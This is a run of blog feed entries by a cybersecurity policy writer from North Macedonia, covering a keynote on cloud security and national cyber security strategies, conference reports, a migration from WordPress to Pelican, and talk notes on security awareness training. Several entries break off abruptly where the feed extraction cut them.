First I would like to thank to the organizers for second time invitation of Economic Forum, in a such beautiful mountain view and spa centers.&lt;/p&gt;
&lt;p&gt;Second, I would like to give you a short introduction of myself. I’m repressing today a NGO as a co-founder of Internet Governance Forum from North Macedonia. I have worked in cybersecurity for more than 12 years in several different industries, startups and international organizations, such as: DiploFoundation, OSCE, OECD, NATO and so on. A part from working experience, also I have graduated master studies in Cyber Security from Estonia, and post-master studies in Security in Computer Systems and Communications from France. Needlessly to say, today I work in cloud security and I’m based in Berlin, Germany. &lt;/p&gt;
&lt;p&gt;I’m here to discuss a topic that recent years it has brought an attention. The constant development of new technologies is accelerating, and the range of digital solutions is continuing to grow. The risk associated with ICT has become increasingly clear in recent years due to a number of incidents. Thus the advent of cloud services, mobile and ICT - based products always brings in a new vulnerabilities. Over the coming years, the digital transformation of both public and private sectors will continue. The development of new technologies will accelerate, and the range of digital solutions will continue to grow.&lt;/p&gt;
&lt;p&gt;For this reason, my speech today will be organized as follows:
- What is digital transformation and why is becoming more popular.
- What are the Challenges and threats in Cloud Computing.
- Which EU member states have addressed a digital transformation and/or cloud computing into their National Cyber Security Strategies.
- What are the best practices and recommendation.
- And finally I will conclude.&lt;/p&gt;
&lt;p&gt;But before I start, I would like to share with you what do we mean by digital transformation. We have heard this terminology couple of time here at other panels at 29th Economic Forum. &lt;/p&gt;
&lt;p&gt;And it is a usage of new, fast and often changing digital technology to solve problems by utilizing cloud computing. But then you might ask yourself why switching from already existing infrastructure to something into “cloud”? There are several reasons for this and bear with me I would only highlight the most important once. That is reducing costs, on-demand self-services, flexibility, rapid elasticity and scalability. And now I might lost you with my nerd language. Let me put it into a simple words:
- Resources are available from anywhere over the network.
- Computing resources available on-demand and self-service, by requesting only as you needed basis.
- You pay only for what you use or reserve.
- You can scale cloud resources - up and down.&lt;/p&gt;
&lt;p&gt;To be able to use all above reasons to switch into cloud, you need to know what kind of cloud computing models you need. And there are several: Private, Community, Public and Hybrid Cloud. I would come back to this models later on a speech.&lt;/p&gt;
&lt;p&gt;Due to the popularity of - digital transformation, that is cloud computing, several organizations that I have worked had migrated their infrastructure into “cloud”, in industries as financial, transport, health, national, tourism, and digital identities providers. And always before the migration starts is the question are we cloud ready. Among ISMS and Data Protection, GDPR and many requirements, there are few other important things to care about security in cloud. Those things are: set of policies, controls, procedures and technologies that work together to protect cloud based systems, and of course data and infrastructure.&lt;/p&gt;
&lt;p&gt;But then few of you might say, hey is in that ISMS, standards, frameworks, regulations and requirements for? You might answer YES, but unfortunately NOT.&lt;/p&gt;
&lt;p&gt;I would share with you a real example. In one of the financial industry where I was working  they have implemented all the security and policy standards, frameworks and requirements. However, when the process of migrating into cloud started we have noticed that their existing security controls, policies and procedures are not cloud ready. The controls have been written 10 or maybe 15 years ago, and indeed they have protected the financial company from attacks and threats within on-prem infrastructure. However, after kick off the digital transformation plan we come to conclusion that if we migrate to cloud computing, half or even more than a half of the controls are no longer applicable. Therefore, we had to review and adjust the controls to meet the security requirements and cloud readiness. And frankly speaking, this might sound very simple task on one hand, but on the other hand it is not.&lt;/p&gt;
&lt;p&gt;As development of new technologies is accelerating, the services are growing as well. Subsequently, future developments in cyber security are hard to predict. However, clear vision of the challenges which is influenced by digital transformation are:
Everything is connected to the Internet - IoT
Amount of data in digital form is only increasing
Shared responsibilities, between state, private companies and cloud service providers
The increased complexity and dependence on ICT-based products and services require a higher lever of expertise&lt;/p&gt;
&lt;p&gt;In past two year few EU countries have updated their National Cyber Security Strategies. This updates are not only to bring better and more secure cyber space in the state but also to adjust to a new technology trends. That said, first country that has taken into account digital transformation and cloud computing is &lt;a href="https://www.enisa.europa.eu/topics/national-cyber-security-strategies/ncss-map/strategies/national-cyber-security-strategy-1/@@download_version/82b3c1a34de449f48cef8534b513caea/file_en"&gt;Dutch National Cyber Security Strategy&lt;/a&gt; updated in April 2018. Followed by &lt;a href="https://www.enisa.europa.eu/topics/national-cyber-security-strategies/ncss-map/strategies/national-strategy-for-cyber-and-information-security/@@download_version/8b31862c3e304fceadc0719d18dc3bb3/file_en"&gt;Danish Cyber and Information Security Strategy&lt;/a&gt; also last year in May. And lastly this year in April &lt;a href="https://www.enisa.europa.eu/topics/national-cyber-security-strategies/ncss-map/strategies/the-national-security-strategy/@@download_version/eb07526e232f4095a00bae0335c9cb02/file_en"&gt;Spanish National Cyber Security Strategy&lt;/a&gt;. Due to the time limitations I would not be able to go through each one of them into details.&lt;/p&gt;
&lt;p&gt;Furthermore, I would share few recommendations taken from mentioned National Cyber Security Strategies and from my experience.
That are:
- Strengthened cyber and information security efforts in the business community.
- Special attention should be paid to protecting technological inherence and industrial and intellectual property.
- Make the most of digital transformation opportunities, by using hybrid cloud model - combined with public and private cloud.&lt;/p&gt;
&lt;p&gt;Last but not least I would like to summarize. Public authorities and businesses have a fundamental responsibility to ensure that security continue the development and digital transformation of the government and private sector towards the required level of security. The goal should be to strengthen trust in the Internet, digital transformation and development of new technologies, helping to build a secure ecosystem that boosts progress of cyber resilience, capacities and cyber security culture in the direction to single digital market. Therefore, if some states are in the process of drafting new version of National Cyber Security Strategies, within join efforts please make sure that you integrate and initiate cloud readiness and digital transformation goals in the strategy.&lt;/p&gt;</content><category term="pages"></category><category term="cyber security"></category><category term="IT security"></category><category term="cloud security"></category><category term="strategy"></category><category term="CII"></category><category term="infrastructure"></category><category term="industry"></category><category term="keynote"></category><category term="key speech"></category><category term="presentation"></category><category term="conference"></category><category term="national cyber security strategy"></category><category term="digital transformation"></category><category term="migration"></category></entry><entry><title>Cyber Security Challenges for 2018</title><link href="https://predragtasevski.com/posts/2017/03/IT-security-2018-challenges/" rel="alternate"></link><published>2017-03-27T00:00:00+02:00</published><updated>2017-03-27T00:00:00+02:00</updated><author><name>Predrag TASEVSKI - Pece</name></author><id>tag:predragtasevski.com,2017-03-27:/posts/2017/03/IT-security-2018-challenges/</id><summary type="html">&lt;p&gt;Cold March and cold Struga, I had an opportunity to present a talk at Second Regional Internet Freedom Summit, organized by American Bar Association Rule of Law Initiative's (ABA ROLI'S) on a topic: Development and Enhancement of Legal Frameworks in Eastern Europe and Eurasia to Protect Internet Freedom Program.&lt;/p&gt;

&lt;p&gt;I have used WordPress for several years, however soon as I got introduced to Drupal from my earlier colleague and a good friend I started to love it. It took me a several week to get to know the way how Drupal works, and the modules = plugins, views, content, etc. Soon as I've seen how easy is the setup, management and maintenance I felt in love from the first sight. Since then I will never switch to anther dynamic CMS solution unless is a static one, such as Pelican.&lt;/p&gt;

Additionally, what made the December special month for Belgrade is that the Philosophical Theater (Drama) hosted the &lt;a href="https://en.wikipedia.org/wiki/Franco_Berardi"&gt;Franco “Bifo” Berardi&lt;/a&gt; on 1th December at &lt;a href="http://www.narodnopozoriste.rs/en/--not-5169-9255-1299-2308"&gt;National Theatre in Belgrade&lt;/a&gt;. I was invited by a friend of mine to attend the discussion with one of the most known philosopher from Italy, and indeed I enjoyed a lot.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Bifo - Belgrade" src="https://scontent-frt3-1.xx.fbcdn.net/hphotos-xfp1/v/t1.0-9/12346300_10153864400614575_6689430077986305516_n.jpg?oh=b44028c36e0f36a4769ca692d7d730a9&amp;amp;oe=56EB8EE9"&gt;&lt;/p&gt;
&lt;p&gt;Nevertheless, I will try to highlight only the discussion in the field of cyber culture and digital divide that was reflected, and not going too much in details about the philosophy and so on. The discussion began within the reading notes from the “&lt;a href="http://www.amazon.com/After-Future-Franco-Bifo-Berardi/dp/1849350590"&gt;After the Future&lt;/a&gt;” book where Bifo reflected on the cyber culture by putting the emphasis that we must stop working due to the fact that  we have been working for the past 300-3000 years. In the background there was a song from &lt;a href="https://www.youtube.com/watch?v=Tgcc5V9Hu3g"&gt;David Bowie – Heroes&lt;/a&gt; which made the discussion much fruitful.&lt;/p&gt;
&lt;p&gt;Moreover, Bifo also share an example of well-known social networking platform Twitter where the main and initial idea was to be an activist platform, rather what is now, and in the end soon was taken over from a big venture capitalist. In some view I might conclude that Bifo it might be a technophobe who is afraid of new technologies, however in the end he is positive and optimistic man. Furthermore, he talked a bit about the Julian Assange and Edward Snowden example, as well of hacktivist &lt;a href="https://en.wikipedia.org/wiki/Aaron_Swartz"&gt;Aaron Swartz&lt;/a&gt;. Then, he noted the symptom of hard side of advertising and how to make conspicuous and distinguishing the distances between body versus voice, as Thom Yorke has expressed his vision of a society, where people are increasingly more obsessed with pointless technology, selfishness and mindless entertainment than life itself.&lt;/p&gt;
&lt;p&gt;&lt;img alt="National Theatre in Belgrade" src="https://scontent-frt3-1.xx.fbcdn.net/hphotos-xfl1/v/t1.0-9/12341197_10153847782034575_2115013709091603844_n.jpg?oh=0e889d9f582e5beca4fbabc44fd77731&amp;amp;oe=56E5ECA2"&gt;&lt;/p&gt;
&lt;p&gt;Something what made me curious is his view of terrorism and terrorists attacks today, where he mentioned that they are not due to the fact of killing someone or have something regarding religion, but in fact the main goal is to kill themselves. Questions were fruitful and he gave indeed philosophical answers, such as &lt;a href="https://en.wikipedia.org/wiki/Zenitism"&gt;Zenitism&lt;/a&gt; as an art movement in Yugoslavia. Further than about UN or different organization what is his view where he noted that the problem between society and politics are in fact relations, where male politicians governs the females – emphasizing that democracy is dead even after the elections or so on. Another question was about view of artificial intelligence how does he see it as a threat or killing the modern capitalism and he shared a positive view by highlighting that the world is smart.&lt;/p&gt;
&lt;p&gt;In the end, after two hours and a half discussion, it was a pleasure to be there and see different views of cyber culture and digital divide opinions. Definitely it made me to over think my thoughts for sure, and at the same time to have a different opinion and to change my view of technology. However, I'm not sure yet what it is? Therefore, I will continue to search for the right answer and draw a map between security and privacy, which unfortunately in end was not discussed.&lt;/p&gt;</content><category term="pages"></category><category term="Balkan"></category><category term="digital devide"></category><category term="IoT"></category><category term="philosophy"></category><category term="Bifo"></category><category term="Franco Berardi"></category><category term="hacktivist"></category><category term="cyber"></category><category term="future"></category><category term="artificial intelligence"></category><category term="zenitism"></category><category term="policy"></category><category term="security"></category></entry><entry><title>National Cyber Security Awareness Month: Introduction to CyberSecurity</title><link href="https://predragtasevski.com/posts/2015/10/awareness-month-cs/" rel="alternate"></link><published>2015-10-28T18:00:00+01:00</published><updated>2015-10-28T18:00:00+01:00</updated><author><name>Predrag TASEVSKI - Pece</name></author><id>tag:predragtasevski.com,2015-10-28:/posts/2015/10/awareness-month-cs/</id><summary type="html">&lt;p&gt;&lt;a href="https://www.facebook.com/acskopje target=" title="_blank"&gt;American Corner Skopje&lt;/a&gt; hosted an event regarding the &lt;a href="https://www.facebook.com/events/406599262872627/ target=" title="_blank"&gt;National Cyber Security Awareness Month&lt;/a&gt;, 28 of October 2015, held my Mr. David Panuel an Information Management Officer from US Embassy in Skopje.&lt;/p&gt;

&lt;p&gt;Mr. Panuel delivered the presentation regarding the three main key awareness aspects about cyber security in general, such as:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Cyber Security definitions&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Internet of Things - IoT and&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Information Assurance&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Additionally he emphasized the three ways to attacks that are available today, for example:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Overloading attacks&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Data Manipulation attacks and&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Data Acquisition attacks&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Where in the end he presented  for each of the above attacks an example scenarios that have occurred recently in US and elsewhere. Moreover, he highlighted the attacks such as Firesale attack known from the movie &lt;a href="https://en.wikipedia.org/wiki/Live_Free_or_Die_Hard"&gt;Live Free or Die Hard&lt;/a&gt; from 2007, which is a three-stage systematic attack on a national computer and critical infrastructure, also known as "Everything must go".  In addition, he mentioned the &lt;a href="https://en.wikipedia.org/wiki/Wardriving"&gt;wardriving&lt;/a&gt; attacks which is constituted by act of searching free hotspots Wi-Fi wireless networks and trying to eavesdrop and collect personal information from the others connected to the network. And finally he noted the US attack in 2013 on OPM site and several other example that have occurred by today.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;My name is Predrag Tasevski and I’m an independent cyber security researcher from Macedonia.&lt;/p&gt;
&lt;p&gt;When we talk about Balkan region it is actually neither one step further nor one step backwards regarding cyber threats and cyber security. And at the same time progression of ICT is improving the  connectivity and its utilities from the rest of the world. For this reason discussing about cyber defense and security capacity in the region is in fact crucial and important topic.
However before we continue we have to understand the difference between IT security and cyber security. IT security is to protect business and individual assets, whereas cyber security it involved IT security as well as national, state security and security of Critical Information Infrastructure point of view.
To be able to have safer cyber space, we need to take an actions. Such as, ratifying conventions for instance Budapest Convention, moreover, adapting legal framework with international and of course social society needs. Than pursue establishment of National Bodies that will deal with occurrence and the frequency of cyberspace attacks and threats. And last but not least, develop national cyber security strategy. Among the mentioned actions, also important is to take into consideration the general approaches, as multi stakeholders and multi-level approach.
Cyberspace could not be 100% secured, therefore each country should introduce national cyber security culture and at the same time raising the awareness level to the weakest link in cyber security - that is the human behaviors.
Moreover, when we discuss about the cyber security and defense another important questions should be raised, by providing of course and answers:
Who? determines the target of who you are planning to secure.
What? determines the content of what to secure.
How? is the means by how you are going to secure it.&lt;/p&gt;
&lt;p&gt;Turning back to Balkan vision toward cyber defense and security, we might say that several countries a much further progressing, such as Slovenia, Croatia, Albania, Montenegro and Bosnia &amp;amp; Herzegovina, in contrast to slowly progressing countries: Macedonia, Serbia and etc.
Nevertheless, the region has taken under the umbrella and understood the importance of such topics and for this reason are taking hence actions. Such actions are as we mentioned previously making their legal framework compliance with the international perspectives. And establishing national bodies to react and countermeasure the incident occurred in cyberspace. And finally establishing national cyber security strategy.&lt;/p&gt;
&lt;p&gt;And in the end I would like to provide recommendation actions that could help other countries in pursuing and capacity building towards cyber defense and security.
Such as:
1. Understand cyber defense from a global perspective, don't feel nervous and foolish when it comes to the word “Cyber”. Use common and simple language that everyone could understand it.
2. Define and implement a national cyber security/defence strategy, followed by cyber security frameworks by supporting it initiatives and international cooperation.
3. Develop public awareness, cyber security culture and education that will touch entire population needs.
4. Improve resilience against cyber terrorism, cyber espionage, hybrid war and cyber warfare by sharing knowledge, documents, continues education and training, military and non-military capabilities.
5. Enforcing ICT infrastructures security in order to obtain confidence and security in the use of ICT. By investing in research and development.
6. And finally, continuance of public meetings and networking are in fact needed and essential on yearly basis for secure cyber space.&lt;/p&gt;
&lt;p&gt;“The first step toward encouraging security and defence is awareness, followed by the implementation, acceptance and so forth”&lt;/p&gt;

&lt;p&gt;Information and communication technologies in Macedonia have experienced a phenomenal growth throughout the last decades, which has had a tremendous impact on governmental services’ presence in the Internet, as well as on everyday life. Against this background, technologies-based growth introduces new risks and threats to the cyber domain in the country. To respond to those challenges the Macedonian government is pursing the establishment of a national authority to react to cyber attacks that occur, or a Computer Incident Response Team – MKD-CIRT, and the adoption of a National Cybersecurity Strategy. However, it should be
taken into account that such tasks are neither easy nor simple. There are several issues that should be considered, for instance: the improvement of the measures for protection of information systems and of the critical infrastructure; the legal and policy framework; the international approach; and the formation of a cybersecurity culture, to name but a few. Simultaneously, considering that Macedonia is a candidate for accession to the EU and NATO, it has to comply with their standards when performing the reforms in the cybersecurity field. The current article briefly introduces the country’s steps towards cybersecurity, provides an analysis of the legal, policy and institutional progress achieved, and suggests recommendations that should be considered to ensure safer, secure, trustworthy and resilient cyber space
in the country.&lt;/p&gt;

This is due to an idiotic incident or I might say stupidity approach of someone, who decided to exploit the vulnerability of wordpress sites on the server where my blog was hosted. Yet, this incident occurred in the middle of this year, and it indeed took me a while to tackle and handle the new blog. Speaking of which the incident, it was perfect timing where I was just thinking of changing and researching which is the most suitable solution to switch from dynamic CMS (Custom Management System) to static one. Why I switched from dynamic to static, I might guess that almost everyone knows the reasons. But let me highlight the most important ones. For instance, static web sites are resistant to the attacks when the intruder requests more then one queries, there is no database in the back-end or on the server needed as requirements, the content of the posts and pages are written in pure markdown or some other plain text format, it is fun - particularly when you need to learn new language or totally new different approach, especially when you could hosted in free, community publicly available services, such as &lt;a href="https://pages.github.com/" target="_blank"&gt;GitHub&lt;/a&gt; and many more. Those are just few reasons why I have decided to use and to switch my blog - homepage from dynamic web content management system to static one.&lt;/p&gt;
&lt;p&gt;Moreover, to switch from dynamic to static, I kind of dig deep into the several static web solutions. However, before I choose the right one, and before checking one by one, I had a requirements list which aims and guide me in selecting and shortening my list. Without any further a do, here are the requirements:
- Static web solution.
- Python language, because I'm more familiar rather then Ruby, Perl, etc.
- Being able and easy to be deployed into GitHub Pages, particularly is because I want it to switch from payed host to a community based one. And most of the &lt;em&gt;nerds&lt;/em&gt; and &lt;em&gt;geeks&lt;/em&gt; nowadays are hosting there sites and blogs at GitHub Pages.
- Be able to write the content with Markdown format, and import and export them from Org-mode format. Because this is the format that I usually use everyday.
- Good documentation and to be able to import the content from WordPress to the required format.
- Easy to be integrated with bootstrap3 and to be responsive, without any further tackling or need to create theme from stretch.
- To be continuously maintained. 
- Any indeed many others, which I could not recall them at the moment, but anyway feel free to add additional requirements.&lt;/p&gt;
&lt;p&gt;Worth withstanding, to mention one site which helped and provide me a perfect list of all freely-publicly available static web site generator  solutions, &lt;a href="https://www.staticgen.com/" target="_blank"&gt;StaticGen&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The competition taking in mind the above requirements was between &lt;a href="http://blog.getpelican.com/" target="_blank"&gt;Pelican&lt;/a&gt; and &lt;a href="http://www.getnikola.com/" target="_blank"&gt;Nikola&lt;/a&gt;. And to be frank with you, I like the Nikola name, mostly because it is Slavic name, however after couple of hours researching I have decided to give it a try to Pelican. Therefore, my first impression of it was that indeed I fell in love with it. Not because it is developed with Python, but also because of the simplicity and the structure of the content using tree approach. Additionally the &lt;a href="http://docs.getpelican.com/en/3.5.0/index.html" target="_blank"&gt;documentation&lt;/a&gt; it-self it is quite good, I say quite because it could be better, but anyway it is well structured. It does provide step-wised methods of how to deploy your blog - pages into several different most popular cloud solutions, and so on. However, in the end for advance futures and advanced theme-ing and so on, you might find it a bit fragile and not enough to prepare you for next steps. Nonetheless, I do not want to give a wrong expression, it is quite well documented and it will provide you nice &lt;a href="http://docs.getpelican.com/en/3.5.0/tips.html" target="_blank"&gt;tips&lt;/a&gt; - before you upload your first gh-pages in Github make sure to check the Tips section.&lt;/p&gt;
&lt;p&gt;At the beginning importing content from the previous system was quite nice done, and it provides you different solutions, such as plugins to import from well known CMS, or you can just import the RSS feeds, which in the end I did it. Anyhow, then you need to choose between tags and slugs what will be the difference and so on. Meantime, you also need to decide which &lt;a href="http://docs.getpelican.com/en/3.5.0/plugins.html" target="_blank"&gt;plugins&lt;/a&gt; and &lt;a href="http://docs.getpelican.com/en/3.5.0/pelican-themes.html" target="_blank"&gt;themes&lt;/a&gt; your are going to use. After you configure your &lt;code&gt;pelicanconf.py&lt;/code&gt;, don't forget to update the IDs for google analytics and the comments system. In the end, before you upload the content to the github pages make sure you understand or you know GitHub commands, otherwise you will be lost like me first hours. But finally I understood that if I would like to use GitHub for future work, most probably I will need to learn and know my way to deal with it. If you do not know, then you will end-up like me deleting the content, then screwing the GitHub repositories and so on.&lt;/p&gt;
&lt;p&gt;Anyway, hope that this will help you to decide if you have any doubts of which static web solution you should use, and how to deploy it and indeed, where as well. Hope you enjoy it and I will try my best to keep this blog up-to date and also share much more with you in near future.&lt;/p&gt;

&lt;/p&gt;

&lt;p&gt;December was a last month of 2013, and for sure the best month. Not
because of the parties, holidays and vacation that they were coming. But
it is because I was selected in a final round of &lt;a href="http://academy.kaspersky.com/cybersecurity/european-round-2014/"&gt;Kaspersky Academy
European Round
2014&lt;/a&gt;
in Milan, Italy. The conference was a part of &lt;a href="http://academy.kaspersky.com/cybersecurity/"&gt;CyberSecurity for the
Next Generation&lt;/a&gt; events
that are happening all over the world. The event took place in 11 until
13 of December 2013, in beautiful and unfortunate at that time foggy
city Milan, and hosted at Politecnico di Milano. Nevertheless, we had a
wonderful time. Before I continue with the presentation of my research
paper I would like to thanks the organizers for such a great
organization and full and frankly not that busy and indeed interesting
agenda. Nice work guys, love you and of course miss you.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Turning to research paper that I presented, "Methodological approach to
security awareness", the presentation is available below as well as my presentation notes.
Without any further ado I will let the notes to speak for themself, as
well as the presentation and the pictures. Hope that you enjoy the
reading.&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;/p&gt;

&lt;p&gt;Ladies and gentlemen, dear committee, my name is Predrag Tasevski from
Macedonia and currently I’m a post-master student in Eurecom, France.
Today I will present you my research study Methodological approach to
security awareness. But before we start I would like to share a short
story.&lt;/p&gt;
&lt;p&gt;Previously I was studying MSc in Cyber security in Estonia. When I was
in the middle of the studies, in the 2011, it was one year after
finished the first year. I went home for the Christmas holidays. At
that time I was curious in opening a company in Macedonia. And for
this reason I went to Central register office.&lt;/p&gt;
&lt;p&gt;When I reached the room number 10 I knocked on the door. Once, two,
three times, and still there was no answer. I push the door and I
entered in empty room full of 6 computers. I shouted few times,
however there was no answer.&lt;/p&gt;
&lt;p&gt;So I started to watch the screens. Unlikely from Estonia, frankly in
Macedonia people love paper-work. Indeed, in the bureaus there where
open documents and the computer’s ware unlocked. Usually, I always I
have with me an external hard drive…&lt;/p&gt;
&lt;p&gt;Then the good side and bad side of me come out .…&lt;/p&gt;
&lt;p&gt;It took me a few minutes to decide,… and likely the good side of me
won. After 30 minutes I was able to get the answers.&lt;/p&gt;
&lt;p&gt;Let us just stop for a second and thing what I could do with this data
…. Could you imagine how reach I would be nowadays if I backup the
data…&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;While I was on the way back home, I started to think why people are so
careless about the information. In reality it just takes one second to
lock the computer. Why people coupled with human factor are actually
the weakest link in security? And therefore for this reason, we
introduce you this study.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Today we will discuss the problem statement and related work. Coupled
with the current awareness level. Secondly, methods and approached
that we have introduced in this study and the curriculum. Last but not
least, we will present the results of the syllabus as a consequence of
the implementation in schools, universities, private and public
organizations. And finally we will conclude.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Numerous amounts of awareness programs exist in the last 20 years.
However their approaches and methods are different. Up to now almost
all the academic effort in information security training has
concentrated on solving the technical and policy aspects, rather than
designing security systems to take into account the human factor. The
human factor is being the most vulnerable threat in the system, and it
could jeopardize the overall efficiency of the organization and
nation. Lastly, few of them have the questionnaire quizzes
implemented.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;The ideas for the awareness program we have implemented are usually
not new, but the uniqueness of our awareness program lies in the style
of communication, the systematic approach of the targeted groups and
the content delivered. Other unique factors are the baseline survey
and questionnaire quiz, and lastly the topic adviser. We believe that
no other previously related work as mention in this study has used
such systematic approach, methods and targeted groups.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;There are three systematical target groups in the syllabus: basic,
advance and management. Each part contains certain number of modules,
divided into units, which are pursued into separate curriculum. In
fact the idea of the target groups is to elevate the awareness level
of three different types of groups of information security. We
emphasize that the weakest element is human behavior, followed by the
socio-technical aspect. Please bear in mind, that this syllabus does
not cover the legal aspects.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;The study provided the entrance for participants only with the Basic
curriculum. The focus is to examine the response of the prior concern
about safety and knowledge of protection of IT assets compared to the
scores earned. In total we had around 1000 participants, from 11 to 63
years old and around 700 of them where male and the rest female. Most
of the them use the computers either at home or work. In the content
of how they want to get education about the IT security is that around
430 answered through Online training. Turning to the current awareness
level before they entered the course is in fact that only 400 of them
were somewhat knowledgeable of how to secure their assets. Also
another interesting fact is that a greater number of the participants
are least concerned about protecting their mobile devices.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;In comparison with the current awareness level we also demonstrate the
average percentage score gained in each unit. Subsequently it allows
us to pin-point modules which participants are more and less
knowledgeable. So as to take tailored measurements for future actions.
For instance Network &amp;amp; Internet Security is the most knowledgeable,
rather than Physical security.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Finally, the threats to cybersecurity are constantly evolving. Thus we
need to ensure that not only the specialist who are protecting IT
systems get a proper awareness education, but also the basic, everyday
users and managers should too. Every manager can be a user, but every
user can not be a manager.&lt;/p&gt;
&lt;p&gt;Thereby, only significant changes in user perception, culture and
education can effectively reduce the number of information and
cybersecurity breaches. Consequently this will raise the awareness
level of the human factor in using technologies in everyday life.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;The strength of our study lies in the results and evidence of
implemented syllabus and it improve everyday work and usage of
technologies.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;We believe that this approach could be implemented effectively in
private, public, military, nations, etc. without a significant
degradation in performance.&lt;/p&gt;
&lt;p&gt;As well as future studies should examine broader views on policy and
legal aspects.&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/p&gt;

&lt;p&gt;Although I did not win, however let me just remind the others that we
are all winners. There were around 60 papers submitted and only 15 were
selected for finale round. We should be proud of our self. And of course
each one of us did a perfect job in presenting own work. Hope that you
all will continue in this path, as well as to see you soon. Friendship
and networking that we had there is my gift from others and Kaspersky.
Thank you once again. Congrats to the winners. Here is a short note from
Kaspersky about the conference, &lt;a href="http://academy.kaspersky.com/cybersecurity-in-milano/" title="CyberSecurity in Milan - Kaspersky"&gt;CyberSecurity in

this year the weather surprised all the participants of &lt;a href="http://www.stockholminternetforum.se/" title="Stockholm Internet Forum 2014"&gt;Stockholm
Internet Forum
2014&lt;/a&gt;.
Although it is one of the most beautiful cities in Europe, it was even
more with rising sun every day. Especially coming from Nice where the
weather was under storm, and sunny and long days in Stockholm were
unforgettable. Before I continue with description and the nature of this
year SIF, first would like to apologize for late post – I was under busy
with examination, second would like to thank the organization for
selecting me as a valuable participant.&lt;span id="more-1158"&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Being in Stockholm for the second time it is a privilege. And indeed,
this year SIF surprised me with the invitation. Usually the organizers
are selecting each year new participant. From their explanation only 10%
of previous year participants are invited where the rest are new.
Consequently, there were around 450 participants, from different
countries in this year SIF14. Nonetheless, it was an event for great
opportunities for networking and meeting interesting people, or see the
rear ones from the previous year.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Speaking of which the event and the panel discussions I might say that
I’m a bit disappointed, because of the repeating of the participant from
SIF13. Another point that I would like to stress out regarding the event
is that in this event the participants are not only a hacktivists,
policy makers, whistleblowers, activities, NGO, etc., but also companies
and so forth. I love the idea of selecting for each panel to have one
enterprise represent, however bear in mind that people will might
exploit this and take and pursue a totally different aspect of the
discussion. Therefore, I suggest for the organization to select wisely
the enterprise panelists. For instance, make sure that the topic and the
theme of the panels are emphasized and understood by the wide audience,
as well as that the chair man and the panelists will control the floor
and that the topic will not go outside of content. This is due to this
event, some panel discussions were totally misunderstood by the audience
and indeed some participants were frustrated, for instance me, but also
many others.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Furthermore, coming back to the selection of percentage of the
participant. I frankly love the idea that you like to bring different
audience and different people each year event, however in my opinion and
as well as from other that we discussed during the event is that will be
much better that from the 10% is either 15-20%. This is due to fact that
most if the time these topics and events only and usually bring new
topics and questions, and not give answers to them. So in this respect
you will have a continuing discussions and most probably some answers,
coupled with outcome.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Also I would like to take an opportunity to respond to the participant
that were emphasizing the participation of one of the hot topic and
indeed well known person, today – Edward Snowden. In respect to their
request where is Snowden and so on, I would like to point out few
things: first in international law it is firstly impossible to bring him
in Sweden because of his status in Russia; moreover there is no need for
him to take participation in the event where we talk about freedom of
Internet, as well as the espionage, privacy, policy, etc.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;To sum, again thanks to the organization for inviting me once again to
the event. Second, by taking into account the above suggestions,
personally thing that the event will be more progressive, as well as
proactive by having outcome. Further, bring people, panelists which are
wisely selected compliance to the topic and theme of the event and/or
discussion. In the end, looking forward seeing you in the next year, as
well hope that I will be taking place this time as one of panelist.
Where not only that I could contribute with the discussion but also
bring some new important questions in the podium.&lt;/p&gt;
&lt;/p&gt;

corporations. Meantime, of my studies, also we highlight the future
research that I’m working on. And of course, the most important part is

assessment. Please bear in mind, that the author is conducting research
in this field, therefore in few months there will be more articles about
cyber-risk and so forth. Nevertheless, hope that the below will guide
you, and will give you better understanding for risk assessment.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Internet has become as essential part of risks in every organization.
Despite all the malicious code and alerts, we use it increasingly.
Therefore, risk assessment is a critical part of risk management in each
organization that deals within the IT infrastructure. Traditionally, the
focus has been related to natural hazards. However, risk assessment has
received much attention in the past decade. Subsequently it is a primary
task in enterprises and it is widely considered a key reason for
improving an organization’s IT performance.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;In content to risk assessment as a part of risk management, additionally
we have the criminality and unlawful exploitations of the Internet.
Accordingly, [1] provides a partial approach to cyber-risk as a vital
feature of risk assessment. Consequently, there are three different
approaches that the studies have tended to focus on, such as, economical
approach [2, 3, 4, 5, 6, 7, 8], cyber-risk coupled with risk management
and insurance [1, 9, 10], and game theory [11, 6, 7]. Moreover, we
define risk when the chosen action or activity will lead to
organizational loss. In addition, risk is the likelihood that something
wrong or/and bad will happen and it will cause harm to the
organizational information asset, or lead to the entire loss of the
asset. In risk, vulnerability is a weakness that could be used to
jeopardize or cause harm. Threat is anything (artificial or act of
nature) that has the potential to cause harm to organizational
